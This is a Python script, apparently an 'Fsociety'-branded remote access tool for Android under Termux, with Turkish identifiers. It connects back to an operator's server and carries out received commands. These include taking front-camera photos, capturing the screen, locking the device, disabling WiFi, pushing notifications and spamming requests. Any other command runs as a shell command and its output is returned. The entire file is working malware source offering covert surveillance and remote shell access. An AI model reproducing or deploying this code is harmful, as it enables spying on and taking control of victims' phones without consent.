import socket
import os
import datetime
import random
import time

sunucu_ip = input("Sunucu IP >> ")
port = int(input("Port >> "))

fsociety_path = "/sdcard/Download/Fsociety"
kamera_path = "/sdcard/Download/DCIM/kamera_fsociety.jpg"
ekran_path = "/sdcard/Download/Pictures/ekran_fsociety.png"
log_file = f"{fsociety_path}/log.txt"
bildirim_sayisi = 0

os.makedirs(fsociety_path, exist_ok=True)

s = socket.socket()
s.connect((sunucu_ip, port))
print(f"[+] Bağlandı: {sunucu_ip}:{port}")

def log_yaz(komut):
    zaman = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"[{zaman}] {komut}\n")

def spam_istek(adet):
    if adet > 1000:
        return "[X] En fazla 1000 istek atabilirsin."
    for _ in range(adet):
        os.system("curl -s https://httpbin.org/get > /dev/null")
    return f"[✓] {adet} istek gönderildi."

def dosya_olustur(adet):
    if adet > 100:
        return "[X] En fazla 100 dosya oluşturabilirsin."
    for i in range(1, adet + 1):
        uzanti = random.choice(["txt", "log", "json"])
        with open(f"{fsociety_path}/dosya_{i}.{uzanti}", "w") as f:
            f.write("Fsociety tarafından oluşturuldu.\n")
    return f"[✓] {adet} dosya oluşturuldu."

while True:
    try:
        komut = s.recv(1024).decode().strip()
        log_yaz(komut)

        if komut == "exit":
            s.send("[✓] Bağlantı kapatıldı.".encode())
            break

        elif komut.startswith("spam-istek "):
            adet = int(komut.split(" ")[1])
            s.send(spam_istek(adet).encode())

        elif komut.startswith("olustur-dosya "):
            adet = int(komut.split(" ")[1])
            s.send(dosya_olustur(adet).encode())

        elif komut.startswith("youtube "):
            link = komut.split(" ", 1)[1]
            os.system(f'am start -a android.intent.action.VIEW -d "{link}"')
            s.send("[✓] YouTube açıldı.".encode())

        elif komut.startswith("google "):
            arama = komut.split(" ", 1)[1]
            link = f"https://www.google.com/search?q={arama.replace(" ", "+")}"
            os.system(f'am start -a android.intent.action.VIEW -d "{link}"')
            s.send("[✓] Google araması yapıldı.".encode())

        elif komut == "wifi-off":
            sonuc = os.system("svc wifi disable")
            if sonuc != 0:
                os.system("am start -a android.settings.WIFI_SETTINGS")
                time.sleep(1)
                os.system("input tap 500 400")  # ekranına göre güncellenebilir
                s.send("[✓] Root yoktu, WiFi ayarı açıldı ve simülasyonla kapatıldı.".encode())
            else:
                s.send("[✓] WiFi kapatıldı.".encode())

        elif komut.startswith("sound "):
            os.system("termux-media-player play /sdcard/Download/*.mp3")
            s.send("[✓] Ses dosyası oynatılıyor.".encode())

        elif komut.startswith("bildirim "):
            try:
                parca = komut.split("\"")
                baslik = parca[1]
                icerik = parca[3]
                os.system(f'termux-notification -t "{baslik}" -c "{icerik}"')
                bildirim_sayisi += 1
                s.send("[✓] Bildirim gönderildi.".encode())
            except:
                s.send("[X] Bildirim gönderilemedi.".encode())

        elif komut == "bildirim-say":
            s.send(f"[✓] Toplam {bildirim_sayisi} bildirim gönderildi.".encode())

        elif komut == "kilit":
            os.system("input keyevent 26")
            s.send("[✓] Ekran kilitlendi.".encode())

        elif komut == "kamera":
            os.system(f"termux-camera-photo -c 1 {kamera_path}")
            s.send("[✓] Fotoğraf çekildi.".encode())

        elif komut == "ekran-al":
            os.system(f"screencap -p {ekran_path}")
            s.send("[✓] Ekran görüntüsü alındı.".encode())

        else:
            sonuc = os.popen(komut).read()
            s.send(sonuc.encode() if sonuc else "[✓] Komut çalıştı.".encode())

    except Exception as e:
        try:
            s.send(f"[X] Hata: {str(e)}".encode())
        except:
            break
